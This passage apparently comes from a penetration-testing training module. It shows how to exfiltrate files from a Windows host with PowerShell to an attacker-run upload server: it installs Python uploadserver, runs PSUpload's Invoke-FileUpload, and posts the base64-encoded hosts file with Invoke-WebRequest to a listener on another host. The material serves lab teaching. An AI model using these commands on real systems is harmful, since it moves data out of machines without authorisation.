## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python [HTTP.server module](https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver.

#### Installing a Configured WebServer with Upload

Installing a Configured WebServer with Upload

```shell-session
glack@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Installing a Configured WebServer with Upload

```shell-session
glack@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
